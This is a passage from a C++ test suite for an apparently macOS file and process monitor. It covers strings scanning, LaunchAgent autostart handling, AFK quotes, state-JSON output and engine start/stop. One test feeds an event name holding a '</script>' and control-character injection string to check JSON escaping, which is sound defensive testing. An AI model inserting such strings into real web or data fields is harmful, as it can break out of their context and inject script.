  sw::g_tStrings=false; const std::string f2=g_home+"/Downloads/mal2"; put(f2,d); sw::stringsScanAsync(f2); CHECK(waitIdle()); CHECK(countEv("STR")==2);   // switched off: silent
  sw::g_tStrings=true; put(f2,d); sw::stringsScanAsync(f2); sw::stringsScanAsync(f2); CHECK(waitIdle()); CHECK(countEv("STR")==3);                       // queued twice, read once
  // the scan is started by the watchers: an unsigned program in a user folder that shows up
  put(g_home+"/Downloads/mal3",d); sw::fileEvent(g_home+"/Downloads/mal3"); g_clock+=1600; sw::fileTick(); CHECK(waitIdle()); CHECK(hasEv("STR","strings:",g_home+"/Downloads/mal3"));
}

static void t_autostart(){
  reset(); sw::g_selfExe="/Applications/Sentinel & Co/SentinelWatch.app/Contents/MacOS/SentinelWatch";
  const std::string pl=g_home+"/Library/LaunchAgents/com.sentinelwatch.agent.plist";
  sw::autostartApply(); CHECK(fs::exists(pl)); const std::string x=slurp(pl); CHECKS(x,sw::launchAgentPlist(sw::g_selfExe));
  CHECK(x.find("<string>/Applications/Sentinel &amp; Co/SentinelWatch.app/Contents/MacOS/SentinelWatch</string>")!=NP); CHECK(x.find("<string>--background</string>")!=NP);
  CHECK(x.find("<key>RunAtLoad</key>")!=NP&&x.find("<true/>")!=NP); CHECK(x.find("<string>Aqua</string>")!=NP); CHECK(x.find("<string>com.sentinelwatch.agent</string>")!=NP);
  struct stat a,b; stat(pl.c_str(),&a); sw::autostartApply(); stat(pl.c_str(),&b); CHECK(a.st_ino==b.st_ino);                  // nothing to change: not rewritten
  sw::g_selfExe="/Applications/Sentinel/SentinelWatch.app/Contents/MacOS/SentinelWatch"; sw::autostartApply();                 // the app was moved: the path is healed
  CHECK(slurp(pl).find("/Applications/Sentinel/SentinelWatch.app")!=NP); CHECK(logText().find("[AUTOSTART] on:")!=NP);
  CHECK(sw::cmdToggle("autostart")); CHECK(!sw::g_tAutostart); CHECK(!fs::exists(pl)); CHECK(logText().find("[AUTOSTART] off")!=NP);
  CHECK(sw::cmdToggle("autostart")); CHECK(sw::g_tAutostart); CHECK(fs::exists(pl)); CHECK(slurp(sw::dataDir()+"/settings.json").find("\"autostart\": true")!=NP);
  CHECK(!sw::cmdToggle("nope"));
  fs::remove(pl); sw::g_selfExe.clear(); sw::autostartApply(); CHECK(!fs::exists(pl));                                          // nothing to start
  CHECK(sw::isOwnAutostart("com.sentinelwatch.agent.plist","/X/Y","/x/y")); CHECK(sw::isOwnAutostart("COM.SentinelWatch.Agent.plist","/x/y","/x/y"));
  CHECK(!sw::isOwnAutostart("com.sentinelwatch.agent.plist","/other","/x/y")); CHECK(!sw::isOwnAutostart("com.evil.plist","/x/y","/x/y")); CHECK(!sw::isOwnAutostart("com.sentinelwatch.agent.plist","/x/y",""));
}

static void t_quotes(){
  reset(); const std::string b=g_root+"/bundle";
  put(b+"/content/facts.txt","F1 hi {user}\nF2\n# a comment\n\n"); put(b+"/content/quotes.txt","Q1 **bold**\r\n"); put(b+"/content/afk.txt","A1 {user}\nA2\n");
  put(sw::dataDir()+"/content/quotes.txt","MY quote\n");                                                                // the user's own file is not overwritten
  sw::loadContent(b);
  CHECKS(slurp(sw::dataDir()+"/content/quotes.txt"),"MY quote\n"); CHECK(fs::exists(sw::dataDir()+"/content/facts.txt")); CHECK(fs::exists(sw::dataDir()+"/content/afk/README.txt"));
  sw::Afk a=sw::afkState(); CHECK(!a.on); CHECK(a.quote.find("{user}")==NP); CHECK(a.quote.rfind("F1 hi ",0)==0||a.quote=="F2"||a.quote=="MY quote"); const unsigned s0=a.seq;
  CHECK(!sw::quoteTick(0)); CHECK(!sw::quoteTick(299.9));
  CHECK(sw::quoteTick(300)); a=sw::afkState(); CHECK(a.on); CHECK(a.quote.rfind("A1 ",0)==0||a.quote=="A2"); CHECK(a.quote.find("{user}")==NP); CHECK(a.seq>s0);   // AFK lines while away
  CHECK(!sw::quoteTick(301)); CHECK(sw::quoteTick(0)); a=sw::afkState(); CHECK(!a.on); CHECK(a.quote.rfind("A",0)!=0);
  g_clock+=119000; CHECK(!sw::quoteTick(0)); g_clock+=1000; const std::string before=sw::afkState().quote; CHECK(sw::quoteTick(0)); CHECK(sw::afkState().quote!=before);   // a new line every 120 s
  bool same=false; for(int i=0;i<200;i++){ g_clock+=120000; const std::string q=sw::afkState().quote; sw::quoteTick(0); if(sw::afkState().quote==q) same=true; } CHECK(!same);   // never the line that is showing
  sw::g_afkIdleSec=10; CHECK(!sw::quoteTick(9)); CHECK(sw::quoteTick(10)); CHECK(sw::afkState().on); sw::quoteTick(0); sw::g_afkIdleSec=0;
  put(sw::dataDir()+"/content/afk.txt",""); sw::loadContent(b); CHECK(sw::quoteTick(400)); CHECK(sw::afkState().on); CHECK(!sw::afkState().quote.empty());       // no AFK lines: no crash, the old line stays
  reset(); const std::string res=g_root+"/res";
  CHECKS(sw::pickAfkVideo(res),""); put(res+"/afk_bg_lite.mp4","x"); CHECKS(sw::pickAfkVideo(res),res+"/afk_bg_lite.mp4"); put(res+"/afk_bg_4k60.mp4","x"); CHECKS(sw::pickAfkVideo(res),res+"/afk_bg_4k60.mp4");
  const std::string own=sw::dataDir()+"/content/afk"; put(own+"/z.mp4","x"); put(own+"/A.MOV","x"); put(own+"/.hidden.mp4","x"); put(own+"/readme.txt","x"); CHECKS(sw::pickAfkVideo(res),own+"/A.MOV");   // the user's own clip wins
}

static void t_state(){
  reset(); sw::appInit(g_root+"/bundle",false);
  sw::pushEvRaw("WARN","evil\"name\n</script>\xFF\xE2\x80\xA8","/x/\\y\x01");
  const std::string j=sw::stateJson("2560 x 1600");
  CHECK(validJson(j)); CHECK(sw::utf8Clean(j)==j); CHECK(j.find("\"display\":\"2560 x 1600\"")!=NP); CHECK(j.find("\"key\":\"autostart\"")!=NP); CHECK(j.find("\"signOk\":true")!=NP);
  size_t n=0; for(size_t k=j.find("\"key\":");k!=NP;k=j.find("\"key\":",k+1)) n++; CHECK(n==(size_t)sw::TOG_N);
  const unsigned r=sw::g_rev.load(); CHECK(sw::cmdToggle("beep")); CHECK(sw::g_rev.load()>r); CHECK(!sw::g_tBeep); CHECK(slurp(sw::dataDir()+"/settings.json").find("\"beep\": false")!=NP);
  const std::string j2=sw::stateJson(""); CHECK(validJson(j2)); CHECK(j2.find("\"name\":\"Beep on suspicious\",\"desc\":\"Audible even behind a full-screen app\",\"on\":false")!=NP);
  for(int i=0;i<100;i++) sw::pushEvRaw("PROC","p","/q"); CHECK(validJson(sw::stateJson("")));
}

static void t_lock(){
  reset(); CHECK(sw::acquireInstanceLock()); CHECK(!sw::acquireInstanceLock()); sw::releaseInstanceLock(); CHECK(sw::acquireInstanceLock()); sw::releaseInstanceLock();
}

static void t_engine(){
  reset(); sw::g_tNotify=false; g_fake.add(1,"a","/Applications/a"); g_fake.add(2,"b","/Applications/b");
  const auto t0=std::chrono::steady_clock::now(); sw::engineStart();
  std::this_thread::sleep_for(std::chrono::milliseconds(700));
  CHECK(logText().find("signature check works")!=NP); CHECK(sw::g_procCount==2); CHECK(hasEv("PROC","a"));                  // first scan done on the engine thread
  g_fake.add(3,"late","/Applications/late"); std::this_thread::sleep_for(std::chrono::milliseconds(2100)); CHECK(hasEv("PROC","late"));   // the 2 s process tick
  const auto t1=std::chrono::steady_clock::now(); sw::engineStop(); CHECK(std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now()-t1).count()<500);   // stops at once, not after its 1 s sleep
  (void)t0;
}

int main(){
  t_text(); t_trust(); t_sign(); t_settings(); t_events(); t_procs(); t_autoruns(); t_token(); t_files(); t_strings(); t_autostart(); t_quotes(); t_state(); t_lock(); t_engine();
  if(!g_root.empty()){ std::error_code ec; fs::remove_all(g_root,ec); }
  printf("mac logic: %d checks, %d failed\n",checks,fails);
  return fails?1:0;
}
